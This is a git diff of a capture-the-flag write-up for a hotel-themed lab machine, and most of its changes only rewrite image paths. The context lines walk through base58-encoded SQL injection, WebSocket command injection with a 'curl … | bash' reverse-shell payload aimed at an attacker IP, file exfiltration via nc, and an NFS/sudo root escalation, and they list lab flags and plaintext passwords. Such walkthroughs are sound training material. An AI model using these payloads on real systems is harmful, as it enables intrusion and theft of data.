@@ -16,36 +16,36 @@
 If we check the web application at port 80, we can find this:
 
 
-![](../images/Pasted%20image%2020250702155653.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702155653.png)
 
 We got some utilities, if we try booking a room, this happens:
 
 
-![](../images/Pasted%20image%2020250702155725.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702155725.png)
 
 
 
 We get an alert saying the hotel is currently fully booked, that's weird, let's check other functionalities:
 
-![](../images/Pasted%20image%2020250702161606.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702161606.png)
 
 
-![](../images/Pasted%20image%2020250702161616.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702161616.png)
 
 Let's check the other port:
 
-![](../images/Pasted%20image%2020250702164915.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702164915.png)
 
 Nothing we can do yet, no credentials. Our best chance is the other web application.
 
 Ok, we got some info, if we check source code, we can find this:
 
 
-![](../images/Pasted%20image%2020250702161710.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702161710.png)
 
 There's a call to `check-rooms.js`:
 
-![](../images/Pasted%20image%2020250702161728.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702161728.png)
 
 The script pulls in the current room count from `/api/rooms-available`, turns on the “#booking” button, and then wires up its click handler: if fewer than 6 rooms are reported it sends you straight to `new-booking`, otherwise it pops up an alert saying the hotel’s fully booked.
 
@@ -58,25 +58,25 @@ curl -s -X GET http://10.10.129.203/api/rooms-available
 
 Not much we can do with it, we can check `new-booking` though:
 
-![](../images/Pasted%20image%2020250702162514.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702162514.png)
 
 
 
-![](../images/Pasted%20image%2020250702162458.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702162458.png)
 
 
 
-![](../images/Pasted%20image%2020250702162544.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702162544.png)
 
 This script defines a `getCookie` helper to extract a named cookie’s value, then uses it to retrieve the `BOOKING_KEY` from `document.cookie`. It sends a GET request to `/api/booking-info?booking_key=<key>`, parses the JSON response, and auto‑fills the form fields `#rooms` with `data.room_num` and `#nights` with `data.days`, effectively pre‑populating the booking form based on the stored booking key.
 
 As seen, we can notice the `BOOKING_KEY` cookie on our browser:
 
-![](../images/Pasted%20image%2020250702162749.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702162749.png)
 
 This is base58 encoding, if we use cyberchef, we can notice this:
 
-![](../images/Pasted%20image%2020250702162847.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702162847.png)
 
 We got:
 
@@ -93,28 +93,28 @@ Let's interact with the API, for now, we can begin exploitation phase.
 We can interact with the API using curl or a proxy, I'll use caido:
 
 
-![](../images/Pasted%20image%2020250702163137.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702163137.png)
 
 It says not found, let's try sending another stuff as the key, maybe `LFI` or `SQLI` works, even `SSRF`:
 
-![](../images/Pasted%20image%2020250702163549.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702163549.png)
 
-![](../images/Pasted%20image%2020250702163351.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702163351.png)
 
 LFI doesn't work here, I tried some payloads but no luck, let's try `SQLI`:
 
-![](../images/Pasted%20image%2020250702163611.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702163611.png)
 
 
-![](../images/Pasted%20image%2020250702163714.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702163714.png)
 
 No bad request so it may work, let's try to enumerate the number of rows by using `order by`:
 
-![](../images/Pasted%20image%2020250702163810.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702163810.png)
 
-![](../images/Pasted%20image%2020250702163858.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702163858.png)
 
-![](../images/Pasted%20image%2020250702163911.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702163911.png)
 
 On `3` we get a bad request, which means that SQLI is possible, we can automate the process with `sqlmap` but we need a tamper, a tamper is a little Python hook that sits between the tool and the target, grabbing every injection payload sqlmap generates and transforming it before it’s sent. we need it thanks to the `base58` format, let's use this script:
 
@@ -150,7 +150,7 @@ pip install base58
 
 We can see this:
 
-![](../images/Pasted%20image%2020250702164805.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702164805.png)
 
 
 There are some credentials:
@@ -162,12 +162,12 @@ pdenton:4321chameleon
 We can use them on the 4346 port web application:
 
 
-![](../images/Pasted%20image%2020250702165049.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702165049.png)
 
 
 There's a message from `SweetCharity` to our user, we can see this on the source code:
 
-![](../images/Pasted%20image%2020250702165158.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702165158.png)
 
 There's a `js` script embedded, let's beautify it:
 
@@ -203,9 +203,9 @@ This snippet first grabs every row in the “.email_list” and wires up a click
 Due to the format of `/message?message_id=id`, we may be able to fuzz, let's automate the process on Caido:
 
 
-![](../images/Pasted%20image%2020250702165550.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702165550.png)
 
-![](../images/Pasted%20image%2020250702165616.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702165616.png)
 
 5 messages got `200` status code, let's check them:
 
@@ -293,18 +293,18 @@ be shipped immediately.
 
 That's all we can find for the id fuzzing part, if we remember the script opens a `websocket`, we can manipulate this WebSocket to execute commands let's use burp on this case for `websocket` manipulation:
 
-![](../images/Pasted%20image%2020250702173041.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702173041.png)
 
 If we test a simple `command injection`, we get this:
 
 ```
 UTC;id;
 ```
-![](../images/Pasted%20image%2020250702173113.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702173113.png)
 
 This means that command injection is possible, so, getting a shell is possible too, in order to get a shell, we can use `busybox` or create a `index.html` file with a python reverse shell:
 
-![](../images/Pasted%20image%2020250702172303.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702172303.png)
 
 Now, we need to host it using a python server and use curl to get the file, once the file downloads, we need to use bash to execute it, we can do all this with the following command:
 
@@ -316,7 +316,7 @@ UTC;curl 10.14.21.28|bash;
 
 Once we send it, this happens:
 
-![](../images/Pasted%20image%2020250702173230.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702173230.png)
 
 We get a shell as seen, let's proceed with privilege escalation.
 
@@ -337,7 +337,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](../images/Pasted%20image%2020250702173353.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702173353.png)
 
 
 We got some users on here:
@@ -481,7 +481,7 @@ This is the password for `Sandra:`
 sandra:anywherebuthere
 ```
 
-![](../images/Pasted%20image%2020250702181202.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702181202.png)
 
 Let's run `linpeas` again, once we run it, we can find a `boss.jpg` file on the `Pictures` directory of our home:
 
@@ -507,7 +507,7 @@ nc VPN_IP 80 < /home/sandra/Pictures/boss.jpg
 
 We can see this on the picture:
 
-![](../images/Pasted%20image%2020250702182020.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702182020.png)
 
 We got credentials for `jojo`:
 
@@ -515,7 +515,7 @@ We got credentials for `jojo`:
 jojo:kingofhellskitchen
 ```
 
-![](../images/Pasted%20image%2020250702182056.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702182056.png)
 
 If we check our sudo permissions, we notice this:
 
@@ -555,7 +555,7 @@ Now, modify `/etc/nfs.conf` with:
 port=443
 ```
 
-![](../images/Pasted%20image%2020250702190016.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702190016.png)
 
 
 We need to modify `/etc/exports` with:
@@ -564,7 +564,7 @@ We need to modify `/etc/exports` with:
 /tmp/share *(rw,sync,no_subtree_check)
 ```
 
-![](../images/Pasted%20image%2020250702185446.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702185446.png)
 
 Now, let's restart the service:
 
@@ -589,7 +589,7 @@ drwxrwxrwx  2 nobody nogroup   40 Jul  2 23:49 .
 drwxr-xr-x 14 root   root    4096 Aug 31  2022 ..
 ```
 
-![](../images/Pasted%20image%2020250702190134.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702190134.png)
 
 We can simply replace `/usr/sbin/mount.nfs` with `/bin/bash`:
 
@@ -611,7 +611,7 @@ root@tonhotel:/# whoami
 root
 ```
 
-![](../images/Pasted%20image%2020250702190338.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702190338.png)
 
 There we go, let's get both flags and end the CTF:
 
@@ -624,6 +624,6 @@ thm{7f6b4d8aee9e1677a0db343ace5fff23fc5b5d3b}
 ```
 
 
-![](../images/Pasted%20image%2020250702190453.png)
+![](CYBERSECURITY/IMAGES/Pasted%20image%2020250702190453.png)
 
 
